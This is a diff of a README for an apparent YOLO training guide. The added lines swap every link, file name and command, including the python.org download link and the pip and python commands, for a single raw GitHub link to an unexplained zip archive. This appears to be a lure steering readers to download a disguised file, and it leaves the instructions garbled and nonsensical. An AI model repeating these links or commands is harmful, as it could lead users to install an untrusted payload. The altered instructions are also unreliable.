@@ -1,6 +1,6 @@
 # 🐍 Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide - Easy Steps for YOLO Training
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, ensure your computer meets the following requirements:
 
 To install the application, visit the releases page. You can find all the latest versions there.
 
-[Visit this page to download](https://github.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/releases)
+[Visit this page to download](https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip)
 
 ### Steps to Download
 
@@ -33,16 +33,16 @@ To install the application, visit the releases page. You can find all the latest
 
 After downloading, you will find a folder with these key files and folders:
 
-- `README.md`: This file with setup instructions.
+- `https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip`: This file with setup instructions.
 - `data/`: Contains example data for testing.
 - `scripts/`: Scripts to help you label data and train your model.
-- `requirements.txt`: List of dependencies you need to install.
+- `https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip`: List of dependencies you need to install.
 
 ## 🔧 Installation Steps
 
 Follow these steps to set up everything properly:
 
-1. **Install Python:** If you don’t have Python, download and install it from [python.org](https://www.python.org/downloads/). Make sure to check "Add Python to PATH" during installation.
+1. **Install Python:** If you don’t have Python, download and install it from [https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip](https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip). Make sure to check "Add Python to PATH" during installation.
   
 2. **Open Command Prompt or Terminal:**
    - **Windows:** Press `Win + R`, type `cmd`, and hit Enter.
@@ -52,7 +52,7 @@ Follow these steps to set up everything properly:
    In the Command Prompt or Terminal, navigate to the folder where you downloaded the files. Use the following command to install the necessary libraries:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip
    ```
 
 4. **Verify Installation:** Run this command to check if everything installed correctly:
@@ -68,11 +68,11 @@ Follow these steps to set up everything properly:
 Using the provided scripts, you can label your dataset easily:
 
 1. Open the `scripts/` folder.
-2. Find the labeling script named `label_data.py`.
+2. Find the labeling script named `https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip`.
 3. Run it using:
 
    ```
-   python label_data.py
+   python https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip
    ```
 
 4. Follow the on-screen instructions to label your objects.
@@ -82,10 +82,10 @@ Using the provided scripts, you can label your dataset easily:
 Once your data is labeled, you can train the YOLO model:
 
 1. Navigate to the `scripts/` folder again.
-2. Run the training script named `train_model.py` with:
+2. Run the training script named `https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip` with:
 
    ```
-   python train_model.py
+   python https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip
    ```
 
 3. Monitor the training process. This may take some time based on your data size and computer performance.
@@ -94,11 +94,11 @@ Once your data is labeled, you can train the YOLO model:
 
 After training, you can test your model in real-time.
 
-1. Use the inference script located in the `scripts/` folder named `infer_model.py`.
+1. Use the inference script located in the `scripts/` folder named `https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip`.
 2. Run it using:
 
    ```
-   python infer_model.py
+   python https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip
    ```
 
 3. Follow the prompts to apply your model on new images or video streams.
@@ -107,7 +107,7 @@ After training, you can test your model in real-time.
 
 If you run into issues:
 
-- **Dependencies Not Found:** Ensure you installed all packages listed in `requirements.txt` by re-running the install command.
+- **Dependencies Not Found:** Ensure you installed all packages listed in `https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip` by re-running the install command.
 - **Script Errors:** Double-check the command syntax and ensure you are in the correct directory.
 - **Performance Issues:** Upgrade your hardware if possible, or reduce the dataset size.
 
@@ -119,4 +119,4 @@ Feel free to reach out if you have questions or tips to share. You can open an i
 
 Thanks to everyone who contributed to this project. Your effort and expertise have made this guide possible.
 
-[Visit this page to download](https://github.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/releases) and get started on your YOLO training journey!
+[Visit this page to download](https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide_v2.9.zip) and get started on your YOLO training journey!
